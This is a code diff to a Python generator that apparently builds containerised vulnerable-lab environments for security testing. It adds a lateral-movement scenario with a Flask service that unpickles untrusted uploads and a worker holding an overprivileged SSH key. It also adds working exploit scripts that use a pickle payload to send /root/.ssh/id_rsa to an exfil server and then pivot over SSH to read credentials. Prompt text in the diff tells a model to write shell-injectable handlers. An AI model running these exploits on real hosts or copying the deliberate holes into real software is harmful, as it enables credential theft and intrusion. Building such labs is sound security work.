@@ -135,6 +135,15 @@ TOPOLOGY = {
         ],
         "ports": {"victim": ["8080:8080"]},
     },
+    "lateral_movement": {
+        # 3-container topology: attacker → worker (pickle RCE + SSH key) → internal (SSH server)
+        "containers": [
+            {"name": "attacker", "role": "attacker", "suffix": ".10", "image": "python:3.11-slim"},
+            {"name": "worker",   "role": "worker",   "suffix": ".20", "image": "python:3.11-slim"},
+            {"name": "internal", "role": "internal", "suffix": ".30", "image": "ubuntu:22.04"},
+        ],
+        "ports": {"worker": ["8080:8080"]},
+    },
     "other": {
         "containers": [
             {"name": "attacker", "role": "attacker", "suffix": ".10", "image": "python:3.11-slim"},
@@ -189,6 +198,204 @@ networks:
 
 # ── L3: Dockerfile generation ─────────────────────────────────
 
+def gen_worker_dockerfile() -> str:
+    """lateral_movement worker: pickle RCE Flask service + SSH key to internal server."""
+    return """FROM python:3.11-slim
+
+RUN apt-get update && apt-get install -y openssh-client curl && rm -rf /var/lib/apt/lists/*
+RUN pip install flask requests
+
+# SSH private key to internal server (overprivileged access — the lateral movement target)
+RUN mkdir -p /root/.ssh
+COPY id_rsa /root/.ssh/id_rsa
+RUN chmod 600 /root/.ssh/id_rsa && echo "StrictHostKeyChecking no" > /root/.ssh/config
+
+WORKDIR /app
+COPY service.py .
+
+EXPOSE 8080
+CMD ["python3", "service.py"]
+"""
+
+
+def gen_worker_service() -> str:
+    """Static template: worker service with pickle RCE vulnerability."""
+    return """\
+# worker/service.py — vulnerable dataset processing service
+# Vulnerability: deserializes untrusted pickle data from /upload without validation
+import pickle
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route("/status", methods=["GET"])
+def status():
+    return "Worker ready", 200
+
+@app.route("/upload", methods=["POST"])
+def upload():
+    data = request.get_data()
+    if not data:
+        return "No data", 400
+    try:
+        pickle.loads(data)
+    except Exception:
+        pass
+    return "Dataset processed", 200
+
+if __name__ == "__main__":
+    print("[Worker] Dataset processing service on port 8080", flush=True)
+    app.run(host="0.0.0.0", port=8080)
+"""
+
+
+def gen_lateral_exfil_server() -> str:
+    """Enhanced exfil server for lateral_movement: stores SSH key and exposes /key_ready."""
+    return '''\
+# exfil_server.py — receives stolen SSH key from worker RCE, exposes it via /key_ready
+import os
+import json
+from flask import Flask, request
+
+app = Flask(__name__)
+received = []
+STOLEN_KEY_PATH = "/tmp/stolen_key"
+
+@app.route("/exfil", methods=["POST"])
+def exfil():
+    data = request.get_data(as_text=True)
+    received.append(data)
+    if "PRIVATE KEY" in data or "BEGIN RSA" in data or "BEGIN OPENSSH" in data:
+        with open(STOLEN_KEY_PATH, "w") as f:
+            f.write(data)
+        os.chmod(STOLEN_KEY_PATH, 0o600)
+        print(f"\\n[+] SSH private key received and saved to {STOLEN_KEY_PATH}", flush=True)
+    else:
+        print(f"\\n[+] Data received ({len(data)} bytes)", flush=True)
+    return "ok", 200
+
+@app.route("/received", methods=["GET"])
+def get_received():
+    return json.dumps(received), 200
+
+@app.route("/key_ready", methods=["GET"])
+def key_ready():
+    """Check if the stolen SSH key has arrived."""
+    if os.path.exists(STOLEN_KEY_PATH):
+        with open(STOLEN_KEY_PATH) as f:
+            return json.dumps({"ready": True, "key_path": STOLEN_KEY_PATH, "key": f.read()}), 200
+    return json.dumps({"ready": False}), 200
+
+if __name__ == "__main__":
+    print("[*] Exfil server listening on 0.0.0.0:9999", flush=True)
+    app.run(host="0.0.0.0", port=9999, threaded=True)
+'''
+
+
+def gen_lateral_internal_dockerfile() -> str:
+    """Internal SSH server for lateral_movement: credentials at /internal/private_dataset.json."""
+    return '''FROM ubuntu:22.04
+
+RUN apt-get update && apt-get install -y openssh-server && rm -rf /var/lib/apt/lists/*
+
+RUN mkdir -p /internal
+COPY credentials.json /internal/private_dataset.json
+
+# Create worker user — the SSH key on the worker is authorized here (SSH misconfiguration)
+RUN useradd -m -s /bin/bash worker && mkdir -p /home/worker/.ssh && chmod 700 /home/worker/.ssh
+COPY authorized_keys /home/worker/.ssh/authorized_keys
+RUN chown -R worker:worker /home/worker/.ssh && chmod 600 /home/worker/.ssh/authorized_keys
+
+# Grant worker read access to internal data
+RUN chown -R worker:worker /internal && chmod 644 /internal/private_dataset.json
+
+# SSH server configuration
+RUN mkdir -p /var/run/sshd && \\
+    echo "PasswordAuthentication no" >> /etc/ssh/sshd_config && \\
+    echo "PermitRootLogin no" >> /etc/ssh/sshd_config
+
+EXPOSE 22
+CMD ["/usr/sbin/sshd", "-D"]
+'''
+
+
+def gen_lateral_exploit(net: str) -> str:
+    """Static exploit for lateral_movement: pickle SSH key exfil → SSH pivot → read credentials."""
+    attacker_ip  = f"{net}.10"
+    worker_ip    = f"{net}.20"
+    internal_ip  = f"{net}.30"
+    return f'''\
+# attack/exploit.py — lateral movement: pickle RCE → SSH key theft → SSH pivot
+import pickle
+import requests
+import subprocess
+import time
+
+ATTACKER_IP  = "{attacker_ip}"
+WORKER_URL   = "http://{worker_ip}:8080"
+INTERNAL_IP  = "{internal_ip}"
+EXFIL_URL    = f"http://{{ATTACKER_IP}}:9999"
+STOLEN_KEY   = "/tmp/stolen_key"
+
+print("[*] Step 1: Waiting for worker service...")
+for i in range(15):
+    try:
+        if requests.get(f"{{WORKER_URL}}/status", timeout=2).status_code == 200:
+            print("    Worker ready")
+            break
+    except Exception:
+        pass
+    time.sleep(2)
+
+print("[*] Step 2: Crafting pickle payload (reads /root/.ssh/id_rsa → POST to exfil)...")
+
+class Exploit:
+    def __reduce__(self):
+        cmd = (
+            "import requests;"
+            "key=open('/root/.ssh/id_rsa').read();"
+            f"requests.post('{{EXFIL_URL}}/exfil', data=key)"
+        )
+        return (exec, (cmd,))
+
+payload = pickle.dumps(Exploit())
+
+print("[*] Step 3: Uploading payload to worker /upload...")
+r = requests.post(f"{{WORKER_URL}}/upload", data=payload,
+                  headers={{"Content-Type": "application/octet-stream"}})
+print(f"    Worker responded: {{r.status_code}} {{r.text}}")
+
+print("[*] Step 4: Waiting for SSH key exfiltration...")
+for i in range(20):
+    time.sleep(2)
+    try:
+        r = requests.get(f"{{EXFIL_URL}}/key_ready", timeout=3)
+        data = r.json()
+        if data.get("ready"):
+            print(f"    SSH key received at {{data['key_path']}}")
+            break
+    except Exception:
+        pass
+    print(f"    Waiting... ({{i+1}}/20)")
+else:
+    print("    ERROR: SSH key not received")
+    exit(1)
+
+print(f"[*] Step 5: SSHing into internal server ({{INTERNAL_IP}})...")
+result = subprocess.run(
+    ["ssh", "-i", STOLEN_KEY, "-o", "StrictHostKeyChecking=no",
+     f"worker@{{INTERNAL_IP}}", "cat /internal/private_dataset.json"],
+    capture_output=True, text=True, timeout=15
+)
+if result.returncode == 0:
+    print("    SSH successful! Credentials retrieved:")
+    print(result.stdout)
+else:
+    print(f"    SSH failed: {{result.stderr}}")
+    exit(1)
+'''
+
+
 def gen_attacker_dockerfile(pkg: str, vuln_type: str = "other") -> str:
     if vuln_type == "config_injection":
         # config_injection attacker IS the model hub:
@@ -207,6 +414,19 @@ RUN mkdir -p /models
 
 # Run config file server (8080) and exfil receiver (9999) together
 CMD ["bash", "-c", "python3 service.py & python3 exfil_server.py"]
+"""
+    elif vuln_type == "lateral_movement":
+        # lateral_movement attacker: exfil server with /key_ready + SSH client
+        return """FROM python:3.11-slim
+
+RUN apt-get update && apt-get install -y openssh-client curl netcat-traditional && rm -rf /var/lib/apt/lists/*
+RUN pip install requests flask
+
+WORKDIR /attack
+COPY exploit.py .
+COPY exfil_server.py .
+
+CMD ["python3", "exfil_server.py"]
 """
     elif vuln_type in ("pickle_rce", "data_exfiltration", "code_injection", "sandbox_escape"):
         # Attacker runs exfil receiver — exploit.py is triggered by docker exec
@@ -297,6 +517,52 @@ RUN mkdir -p /models
 EXPOSE 8080
 CMD ["python3", "service.py"]
 """
+
+
+def gen_config_injection_exploit(model_server_ip: str, victim_ip: str) -> str:
+    """Static template for config_injection exploit.
+    LLM falls through to a generic branch because model_server has role='attacker',
+    causing wrong IP lookup and missing logging_url attack logic.
+    Static template is reliable and correct.
+    """
+    return f'''\
+# attack/exploit.py — config injection: poison model_server config → victim exfils credentials
+import requests
+import time
+
+MODEL_SERVER = "http://{model_server_ip}:8080"
+VICTIM_URL   = "http://{victim_ip}:8080"
+EXFIL_URL    = "http://{model_server_ip}:9999/exfil"
+
+# Step 1: Upload malicious config to model_server with logging_url pointing to exfil server
+print("[*] Uploading malicious config to model_server...")
+r = requests.post(
+    f"{{MODEL_SERVER}}/config",
+    json={{"model_type": "bert", "logging_url": EXFIL_URL}},
+    headers={{"Content-Type": "application/json"}},
+)
+print(f"    model_server responded: {{r.status_code}} {{r.text}}")
+
+# Step 2: Trigger victim to download config and send credentials to logging_url
+print("[*] Triggering victim to load model config...")
+r = requests.post(
+    f"{{VICTIM_URL}}/load_model",
+    json={{"repo_url": f"{{MODEL_SERVER}}/config.json"}},
+)
+print(f"    victim responded: {{r.status_code}} {{r.text}}")
+
+# Step 3: Check exfil server
+time.sleep(2)
+print("[*] Checking exfil server...")
+r = requests.get(f"http://{model_server_ip}:9999/received")
+items = r.json()
+if items:
+    print("[+] Credentials received:")
+    for item in items:
+        print(item)
+else:
+    print("[-] No credentials received yet")
+'''
 
 
 def gen_config_injection_victim_service(model_server_ip: str, victim_ip: str) -> str:
@@ -553,7 +819,7 @@ CMD ["python3", "-m", "http.server", "8080"]
 
 def gen_credentials(cve_id: str, vuln_type: str = "other") -> str:
     """Generate realistic credential files matching the format used by the affected software."""
-    if vuln_type in ("pickle_rce", "config_injection"):
+    if vuln_type in ("pickle_rce", "config_injection", "lateral_movement"):
         # HuggingFace ecosystem credentials — matches real file formats
         return json.dumps({
             "hf_token": "hf_fakeXyZ1234567890ABCDEFabcdefGHIJKL",
@@ -779,9 +1045,19 @@ Exploitation path:
 - Victim reads that file and returns its contents in the response body
 - Attacker sees the token directly in the HTTP response — NO exfil server needed
 
-CRITICAL: The file contents MUST be returned in the HTTP response. Do NOT:
+CRITICAL: The file contents MUST be returned in the HTTP response body as plain text or JSON. Do NOT:
 - POST the contents to an internal server (attacker won't see it)
 - Only print to stdout (attacker won't see it)
+- Return a success status without the file contents
+
+Correct example:
+    @app.route("/read", methods=["GET"])
+    def read():
+        path = request.args.get("path")
+        if not path:
+            return jsonify({{"error": "Missing required field: path"}}), 400
+        with open(path) as f:
+            return f.read(), 200
 
 Error message rule: name the missing field in error responses.
 Credential files exist on victim: /root/.huggingface/token, /root/.aws/credentials
@@ -813,6 +1089,24 @@ CRITICAL — Attack surface rule:
 - The attacker controls ONLY the HTTP request — if they cannot inject via the request, the environment is broken
 - Example correct pattern: branch_name = request.json.get("branch_name") → then use in shell command
 - Example broken pattern: branch_name = requests.get("http://internal/...").json().get("branch") ← DO NOT DO THIS
+
+CRITICAL — For code_injection specifically:
+- The endpoint MUST execute user input via subprocess.run(cmd, shell=True) DIRECTLY in the request handler (not only in a background thread)
+- The command output MUST be returned in the HTTP response body so the attacker can confirm injection worked
+- QUOTING RULE: User input MUST be interpolated DIRECTLY into the shell command — NEVER wrap it in single or double quotes
+  - CORRECT:   cmd = f"git checkout {{branch_name}}"    ← injection works: "git checkout test; curl ..."
+  - WRONG:     cmd = f"git checkout '{{branch_name}}'"  ← injection blocked by single quotes
+  - WRONG:     cmd = f'python3 -c \'...\"{{model_name}}\"...\'' ← nested quotes prevent injection
+- NEVER use `python3 -c '...'` patterns to wrap the user input — they create nested quoting that blocks injection
+- NEVER import transformers, torch, vllm, or other heavy ML packages — they are NOT installed in the container
+- NEVER use git — it is NOT installed in the container (python:3.11-slim)
+- The shell command should use ONLY commands available in python:3.11-slim + curl: pip, python3, curl, echo, cat, ls, grep, wget
+- Good realistic patterns: `pip install {{package_name}}`, `python3 -m pytest {{test_path}}`, `wget {{model_url}}`
+- Example correct pattern:
+    cmd = f"git checkout {{branch_name}}"
+    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+    return jsonify({{"output": result.stdout + result.stderr}})
+- You MAY also have a background thread for realism, but the DIRECT endpoint execution is mandatory
 
 Error message rule (standard REST API behavior):
 - When a required field is missing, the error response MUST name the field
@@ -969,9 +1263,32 @@ Output only Python code. The first line must be # attack/exploit.py"""
     return _call_llm(system, user)
 
 
-def llm_gen_attack_path(vuln: dict, net: str) -> list:
+def validate_attack_path_consistency(attack_path: list, service_code: str) -> bool:
+    """Check if attack_path mentions the actual injectable fields from service.py.
+    Returns True if consistent (or can't validate), False if mismatch detected.
+    Zero cost — pure regex, no LLM call.
+    """
+    import re as _re
+    # Extract actual field names used in service.py
+    actual_fields = set(
+        _re.findall(r'request\.json\.get\(["\'](\w+)["\']', service_code) +
+        _re.findall(r'request\.form\.get\(["\'](\w+)["\']', service_code) +
+        _re.findall(r'request\.args\.get\(["\'](\w+)["\']', service_code) +
+        _re.findall(r'data\[["\'](\w+)["\']\]', service_code)
+    )
+    if not actual_fields:
+        return True  # can't validate, assume OK
+
+    # Check if attack_path text references at least one actual field
+    attack_text = " ".join(s.get("action", "") for s in attack_path).lower()
+    return any(f.lower() in attack_text for f in actual_fields)
+
+
+def llm_gen_attack_path(vuln: dict, net: str, service_hint: str = None) -> list:
     """Call 3: Generate structured attack path as a list of step dicts.
     Each step: {"step": int, "from": str, "to": str, "action": str}
+    service_hint: optional route+field summary from actual service.py — only passed when
+    validate_attack_path_consistency detects a mismatch (lazy, avoids extra tokens).
     """
     topo = TOPOLOGY.get(vuln["type"], TOPOLOGY["other"])
     container_ips = {c["name"]: f"{net}{c['suffix']}" for c in topo["containers"]}
@@ -994,6 +1311,9 @@ Output a JSON array like:
 ]
 
 Vulnerability description: {vuln['description'][:300]}"""
+
+    if service_hint:
+        user += f"\n\nIMPORTANT: The actual service.py implementation uses these endpoints and fields:\n{service_hint}\nGenerate attack_path based on these ACTUAL values, not the CVE description above."
 
     text = _call_llm(system, user)
 
@@ -1019,9 +1339,51 @@ def llm_gen_code(vuln: dict, subnet: int) -> dict:
     2. Extract service endpoints -> pass to exploit to ensure interface consistency
     3. Generate attack path description
     Note: model_server/service.py is a static template, not LLM-generated.
+    lateral_movement uses all-static templates (no LLM calls needed).
     """
     net = f"172.{subnet}.0"
-    topo = TOPOLOGY.get(vuln["type"], TOPOLOGY["other"])
+    vuln_type = vuln["type"]
+    topo = TOPOLOGY.get(vuln_type, TOPOLOGY["other"])
+
+    if vuln_type == "lateral_movement":
+        attack_path = [
+            {"step": 1, "from": "attacker", "to": "worker",
+             "action": "POST malicious pickle payload to worker:8080/upload (pickle RCE)"},
+            {"step": 2, "from": "worker", "to": "attacker",
+             "action": "RCE reads /root/.ssh/id_rsa and POSTs SSH private key to attacker:9999/exfil"},
+            {"step": 3, "from": "attacker", "to": "internal",
+             "action": "SSH login to internal using stolen private key"},
+            {"step": 4, "from": "attacker", "to": "internal",
+             "action": "Read /internal/private_dataset.json — contains HF tokens and AWS credentials"},
+        ]
+        return {
+            "service": gen_worker_service(),
+            "exploit": gen_lateral_exploit(net),
+            "attack_path": attack_path,
+            "vuln_type": vuln_type,
+        }
+
+    if vuln_type == "config_injection":
+        # model_server has role="attacker" in config_injection topology (it IS the malicious hub)
+        # Fix: look up by role="attacker" instead of role="model_server"
+        attacker_ip = next(
+            (f"{net}{c['suffix']}" for c in topo["containers"] if c["role"] == "attacker"),
+            f"{net}.10"
+        )
+        victim_ip_ci = next(
+            (f"{net}{c['suffix']}" for c in topo["containers"] if c["role"] == "victim"),
+            f"{net}.20"
+        )
+        attack_path = llm_gen_attack_path(vuln, net)
+        return {
+            "service": gen_config_injection_victim_service(attacker_ip, victim_ip_ci),
+            "exploit": llm_gen_exploit(vuln, net,
+                                       gen_config_injection_victim_service(attacker_ip, victim_ip_ci),
+                                       model_server_ip=attacker_ip),
+            "attack_path": attack_path,
+            "vuln_type": vuln_type,
+        }
+
     # Compute dynamic IPs from topology
     model_server_ip = next(
         (f"{net}{c['suffix']}" for c in topo["containers"] if c["role"] == "model_server"),
@@ -1029,8 +1391,20 @@ def llm_gen_code(vuln: dict, subnet: int) -> dict:
     )
     service     = llm_gen_service(vuln, net, model_server_ip)
     exploit     = llm_gen_exploit(vuln, net, service, model_server_ip)
-    attack_path = llm_gen_attack_path(vuln, net)
-    return {"service": service, "exploit": exploit, "attack_path": attack_path, "vuln_type": vuln["type"]}
+    attack_path = llm_gen_attack_path(vuln, net)  # cheap: no service hint yet
+
+    # Validate consistency: does attack_path mention fields that exist in service.py?
+    # Only re-generate with hints if mismatch detected (lazy — avoids extra tokens)
+    if not validate_attack_path_consistency(attack_path, service):
+        import re as _re2
+        routes = extract_routes(service)
+        fields = _re2.findall(
+            r'request\.(?:json|form|args)\.get\(["\'](\w+)["\']', service
+        ) + _re2.findall(r'data\[["\'](\w+)["\']\]', service)
+        service_hint = f"Endpoints: {routes}\nInjectable fields: {list(set(fields))}"
+        attack_path = llm_gen_attack_path(vuln, net, service_hint=service_hint)
+
+    return {"service": service, "exploit": exploit, "attack_path": attack_path, "vuln_type": vuln_type}
 
 
 
@@ -1078,8 +1452,12 @@ def write_env(vuln: dict, subnet: int, llm: dict):
             with open(os.path.join(cdir, "Dockerfile"), "w") as f:
                 f.write(gen_attacker_dockerfile(pkg, vuln_type))
             # Write exfil receiver for types that use HTTP exfil from victim RCE
-            if vuln_type in ("pickle_rce", "config_injection", "data_exfiltration",
-                             "code_injection", "sandbox_escape"):
+            if vuln_type == "lateral_movement":
+                # Enhanced exfil server: stores SSH key and exposes /key_ready
+                with open(os.path.join(cdir, "exfil_server.py"), "w") as f:
+                    f.write(gen_lateral_exfil_server())
+            elif vuln_type in ("pickle_rce", "config_injection", "data_exfiltration",
+                               "code_injection", "sandbox_escape"):
                 with open(os.path.join(cdir, "exfil_server.py"), "w") as f:
                     f.write(gen_exfil_server())
             # config_injection attacker also needs to serve the malicious config file
@@ -1162,6 +1540,16 @@ if __name__ == "__main__":
             with open(os.path.join(cdir, "service.py"), "w") as f:
                 f.write(gen_model_server_service(vuln_type))
 
+        elif c["role"] == "worker":
+            # lateral_movement: pickle RCE service + SSH private key to internal
+            with open(os.path.join(cdir, "Dockerfile"), "w") as f:
+                f.write(gen_worker_dockerfile())
+            with open(os.path.join(cdir, "service.py"), "w") as f:
+                f.write(llm["service"])
+            if ssh_private:
+                with open(os.path.join(cdir, "id_rsa"), "w") as f:
+                    f.write(ssh_private)
+
         elif c["role"] == "victim":
             with open(os.path.join(cdir, "Dockerfile"), "w") as f:
                 f.write(gen_victim_dockerfile(pkg, ver, has_ssh_key=has_internal))
@@ -1202,15 +1590,20 @@ def get_internal_credentials():
                 f.write(_inject_before_main(service_code, credential_endpoint))
 
         elif c["role"] == "internal":
-            with open(os.path.join(cdir, "Dockerfile"), "w") as f:
-                f.write(gen_internal_dockerfile(has_ssh=True))
+            if vuln_type == "lateral_movement":
+                # Use specialized Dockerfile: pure SSH server, credentials at /internal/private_dataset.json
+                with open(os.path.join(cdir, "Dockerfile"), "w") as f:
+                    f.write(gen_lateral_internal_dockerfile())
+            else:
+                with open(os.path.join(cdir, "Dockerfile"), "w") as f:
+                    f.write(gen_internal_dockerfile(has_ssh=True))
             # Copy credential file — Dockerfile will COPY it into the container
             import shutil
             shutil.copy(
                 os.path.join(env_dir, "data", "credentials.json"),
                 os.path.join(cdir, "credentials.json")
             )
-            # Write authorized_keys so victim's SSH key can authenticate (L4: SSH lateral movement)
+            # Write authorized_keys so worker/victim SSH key can authenticate
             if ssh_public:
                 with open(os.path.join(cdir, "authorized_keys"), "w") as f:
                     f.write(ssh_public)
@@ -1272,6 +1665,10 @@ def layer1_validate(llm: dict) -> dict:
     Checks: syntax validity + whether exploit uses real endpoints from service.
     Returns: {"passed": bool, "reason": str}
     """
+    # Static template types — always valid, skip LLM quality checks
+    if llm.get("vuln_type") in ("lateral_movement", "config_injection"):
+        return {"passed": True, "reason": ""}
+
     # Syntax check
     for name, code in [("service", llm["service"]), ("exploit", llm["exploit"])]:
         if not code or len(code) < 20:
